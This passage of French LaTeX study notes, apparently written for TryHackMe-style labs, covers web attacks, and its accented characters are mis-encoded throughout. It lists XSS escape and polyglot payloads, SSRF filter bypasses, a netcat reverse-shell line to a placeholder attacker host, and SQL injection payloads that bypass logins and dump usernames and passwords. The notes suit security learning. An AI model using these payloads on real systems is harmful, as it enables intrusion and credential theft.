Souvent, la valeur envoyÃ©e va Ãªtre vÃ©rifiÃ©e, ou placÃ©e dans un Ã©lÃ©ment HTML, mais Ã§a reste parfois contournable.

\\subsubsection{Ã‰lÃ©ments HTML}

\\textbf{Input :}

\\begin{codebox}{xss-input.html}
\\begin{lstlisting}[language=HTML]
'><script>...</script>
\\end{lstlisting}
\\end{codebox}

Ã‰chappe la fin du input.

\\textbf{Textarea :}

\\begin{codebox}{xss-textarea.html}
\\begin{lstlisting}[language=HTML]
</textarea><script>...</script>
\\end{lstlisting}
\\end{codebox}

Balise de fin.

\\textbf{JS directement :}

\\begin{codebox}{xss-js.js}
\\begin{lstlisting}[language=Java]
';alert('failleXSSTrouvee');//
\\end{lstlisting}
\\end{codebox}

Dans le cas oÃ¹ le code JS met directement la valeur dedans, on sort avec \\monosp{'}, on exÃ©cute notre payload puis avec \\monosp{//} on fait passer le reste du code en commentaire.

\\subsubsection{Filtrage de la String}

\\textbf{Si "script" est filtrÃ© :}

\\begin{codebox}{xss-bypass-script.html}
\\begin{lstlisting}[language=HTML]
<scscriptript>...</scriscriptpt>
\\end{lstlisting}
\\end{codebox}

Bon vieux trick comme pour le File Inclusion.

\\textbf{Si "<" et ">" filtrÃ©s :}

\\begin{codebox}{xss-bypass-brackets.html}
\\begin{lstlisting}[language=HTML]
src=/images/cat.jpg" onload="alert('THM');
\\end{lstlisting}
\\end{codebox}

On peut utiliser les attributs JavaScript des Ã©lÃ©ments (img par exemple).

\\subsubsection{XSS Polyglot}

Cette horreur fait tout Ã  la fois :

\\begin{codebox}{xss-polyglot.js}
\\begin{lstlisting}[language=html]
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('THM')//>\\x3e
\\end{lstlisting}
\\end{codebox}

\\section{SSRF (Server-Side Request Forgery)}

\\subsection{Concept}

Le serveur va faire un appel API dÃ©pendant des modifications faites sur la page, on tente donc de manipuler cet appel pour rÃ©cupÃ©rer des donnÃ©es. Ressemble d'une certaine faÃ§on aux File Inclusion, de par la manipulation d'URL.

\\subsection{Spotting}

\\subsubsection{URL Inception}

Quand dans une URL, on en retrouve une autre.

Exemple : \\urlcode{https://mapage.com/server=https://data.com}

\\subsubsection{Hidden Form URL}

Quand un formulaire contient une URL cachÃ©e.

\\begin{codebox}{hidden-form.html}
\\begin{lstlisting}[language=HTML]
<form action="/fetch-remote-resource" method="POST">
    <!-- Champ cache contenant une URL fournie par l'utilisateur -->
    <input type="hidden" name="target_url" 
           value="http://exemple-interne.local/resource">
    
    <button type="submit">Envoyer</button>
</form>
\\end{lstlisting}
\\end{codebox}

\\subsubsection{Partial URL}

On retrouverait par exemple le nom du serveur Ã  appeler.

Exemple : \\urlcode{https://mapage.com/server=api}

\\subsubsection{URL Path}

Dans le cas oÃ¹ on retrouve le path d'une URL.

Exemple : \\urlcode{https://mapage.com/dest=/forms/contact/}

\\subsection{Utilisation}

\\subsubsection{Redirection externe}

En changeant la route d'appel API, on peut ainsi accÃ©der Ã  des API internes au service.

\\subsubsection{Redirection interne}

On peut aussi rediriger vers notre propre serveur, afin de capturer les headers de requÃªte.

\\textbf{Tips :} Pour couper une URL (par exemple param \\monosp{server=XXX}), on finit par \\monosp{\\&x=}, ce qui bloque la fin de l'URL.

\\subsection{Protections}

\\subsubsection{Deny List}

Les adresses bloquÃ©es (gÃ©nÃ©ralement \\monosp{Localhost} et \\ip{169.254.169.254} car infos sur la machine/infrastructure cloud) peuvent Ãªtre contournÃ©es :

\\begin{itemize}
    \\item En utilisant un alias pour localhost : \\monosp{0}, \\monosp{0.0.0.0}, \\monosp{0000}, \\monosp{127.1}, \\monosp{127.*.*.*}, \\monosp{2130706433}, \\monosp{017700000001}
    \\item En utilisant des sous-domaines DNS qui pointent vers l'adresse en question
\\end{itemize}

\\subsubsection{Allow List}

Ã€ l'inverse, par exemple seules les URL provenant de \\urlcode{https://page.com} pourraient Ãªtre autorisÃ©es. Pour contourner Ã§a, on peut crÃ©er un sous-nom de domaine : \\urlcode{https://page.com.attack.fr}.

\\subsubsection{Open Redirect}

Si le filtre est \\urlcode{https://page.com/} (avec un slash final), on ne peut pas utiliser le trick du DNS. On peut donc chercher un endpoint du type \\urlcode{https://page.com/link=https://XXX} pour l'utiliser.

\\section{Command Injection}

\\subsection{Concept}
Des applis (PHP, Python, NodeJS) passent des entrÃ©es utilisateur Ã  des commandes OS (\\textit{grep}, \\textit{subprocess}, etc.). Si l'entrÃ©e n'est pas contrÃ´lÃ©e, un attaquant peut \\textbf{chaÃ®ner ou remplacer} la commande et exÃ©cuter du code.

\\subsection{DÃ©tection}
\\begin{itemize}
    \\item \\textbf{Verbose} : sortie visible (ex: \\monosp{whoami} affichÃ© dans la page).
    \\item \\textbf{Blind} : pas de sortie; tester des \\textit{delays} (\\monosp{ping}, \\monosp{sleep}) ou redirections (\\monosp{> /tmp/out}; puis \\monosp{cat}).
    \\item \\textbf{ChaÃ®nage} : opÃ©rateurs \\monosp{;} \\monosp{\\&} \\monosp{\\&\\&} pour exÃ©cuter plusieurs commandes.
\\end{itemize}

\\subsection{Exemples rapides}
\\begin{itemize}
    \\item \\textbf{curl} : \\urlcode{http://vulnerable.app/process.phpsearch=The\\%20Beatles;whoami}
    \\item \\textbf{Linux} : \\monosp{whoami}, \\monosp{ls}, \\monosp{ping -c 5 127.0.0.1}, \\monosp{sleep 5}, \\monosp{nc -e /bin/sh ATTACKER:PORT}
    \\item \\textbf{Windows} : \\monosp{whoami}, \\monosp{dir}, \\monosp{ping -n 5 127.0.0.1}, \\monosp{timeout /t 5}
\\end{itemize}

\\subsection{PrÃ©vention (dev view)}
\\begin{itemize}
    \\item Ã‰viter les fonctions dangereuses (PHP: \\monosp{exec}, \\monosp{passthru}, \\monosp{system}).
    \\item \\textbf{Sanitisation/Validation} stricte : n'accepter que des formats attendus (ex: chiffres 0-9), filtrer caractÃ¨res spÃ©ciaux (\\monosp{> \\& /}).
    \\item PrÃ©fÃ©rer APIs/bibliothÃ¨ques plutÃ´t que shell.
\\end{itemize}

\\section{SQL Injection}

\\subsection{In-Band SQL Injection}

\\subsubsection{Concept}
Exploitation via le \\textbf{mÃªme canal} de communication : dÃ©couvrir et exploiter une vulnÃ©rabilitÃ© SQL directement sur la page web, extraire des donnÃ©es de la base de donnÃ©es affichÃ©es sur la mÃªme page.

\\subsubsection{Error-Based}
Les messages d'erreur de la base sont affichÃ©s au navigateur. Utile pour Ã©numÃ©rer la structure de la BD.

\\textbf{DÃ©tection :} Tester des caractÃ¨res spÃ©ciaux (\\monosp{'} ou \\monosp{"}) aprÃ¨s un paramÃ¨tre (ex: \\monosp{id=1'}) pour dÃ©clencher une erreur.

\\textbf{Exemple :} Si \\monosp{id=1'} retourne une erreur SQL, la vulnÃ©rabilitÃ© est confirmÃ©e.

\\subsubsection{Union-Based}
Utilise l'opÃ©rateur SQL \\monosp{UNION} pour retourner des rÃ©sultats supplÃ©mentaires. MÃ©thode la plus courante pour extraire de gros volumes de donnÃ©es.

\\textbf{Ã‰tapes :}
\\begin{enumerate}
    \\item Trouver le nombre de colonnes : \\monosp{1 UNION SELECT 1} â†’ \\monosp{1 UNION SELECT 1,2} â†’ \\monosp{1 UNION SELECT 1,2,3} (jusqu'Ã  pas d'erreur).
    \\item Annuler les premiers rÃ©sultats : \\monosp{0 UNION SELECT 1,2,3} (remplacer ID par 0).
    \\item Extraire des infos :
    \\begin{itemize}
        \\item BD courante : \\monosp{0 UNION SELECT 1,2,database()}
        \\item Tables : \\monosp{0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nom_bd'}
        \\item Colonnes : \\monosp{0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nom_table'}
        \\item DonnÃ©es : \\monosp{0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users}
    \\end{itemize}
\\end{enumerate}

\\subsection{Blind SQL Injection}

Peu ou pas de feedback visible ; les messages d'erreur sont dÃ©sactivÃ©s mais l'injection fonctionne.

\\subsubsection{Authentication Bypass}
Les formulaires de login vÃ©rifient si username ET password forment une paire valide. Injection d'une condition \\textit{toujours vraie} :

\\textit{Payload :} \\monosp{' OR 1=1;--}

Exemple : champ password \\monosp{' OR 1=1;--} transforme la requÃªte en :
\\begin{lstlisting}[language=SQL]
SELECT * FROM users WHERE username='' AND password='' OR 1=1;--
\\end{lstlisting}

Puisque \\monosp{1=1} est vrai et on utilise \\monosp{OR}, la requÃªte retourne toujours vrai.

\\subsubsection{Boolean-Based}
RÃ©ponses true/false, yes/no, 1/0. Ã‰numÃ©ration trÃ¨s lente mais possible en testant chaque caractÃ¨re.

\\textbf{Exemple API} : \\urlcode{https://website.thm/checkuser?username=admin} retourne \\monosp{\\{"taken":true\\}}.

\\textbf{Ã‰numÃ©ration du nom de BD :}
\\begin{lstlisting}[language=SQL]
admin123' UNION SELECT 1,2,3 where database() like 's%';--
\\end{lstlisting}

Tester \\monosp{s\\%}, \\monosp{sa\\%}, \\monosp{sq\\%}, etc. jusqu'Ã  obtenir \\textit{true}. RÃ©pÃ©ter pour chaque caractÃ¨re.

\\textbf{Tables et colonnes :}
\\begin{lstlisting}[language=SQL]
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema='sqli_three' and table_name like 'u%';--
\\end{lstlisting}

\\subsubsection{Time-Based}
Pas d'indicateur visuel ; le dÃ©lai de rÃ©ponse indique un payload valide. Utiliser \\monosp{SLEEP(x)}.

\\textbf{Exemple :}
\\begin{lstlisting}[language=SQL]
admin123' UNION SELECT SLEEP(5);--
\\end{lstlisting}

Pas de dÃ©lai = mauvais nombre de colonnes. Ajouter des colonnes :
\\begin{lstlisting}[language=SQL]
admin123' UNION SELECT SLEEP(5),2;--
\\end{lstlisting}

Si dÃ©lai de 5 sec â†’ \\textit{true}. Puis Ã©numÃ©rer comme Boolean-Based en ajoutant \\monosp{SLEEP()} Ã  chaque requÃªte.

\\subsection{Out-of-Band SQL Injection}

Deux canaux de communication : attaque par web request, rÃ©sultats par HTTP/DNS vers un serveur contrÃ´lÃ©. DÃ©pend de features BD spÃ©cifiques ou logique applicative.

\\textbf{Processus :}
\\begin{enumerate}
    \\item Attaquant envoie payload avec injection SQL.
    \\item App fait requÃªte BD qui exÃ©cute le payload.
    \\item Payload force une requÃªte HTTP/DNS vers la machine de l'attaquant.
    \\item Attaquant rÃ©cupÃ¨re les donnÃ©es dans la requÃªte reÃ§ue.
\\end{enumerate}

\\end{document}


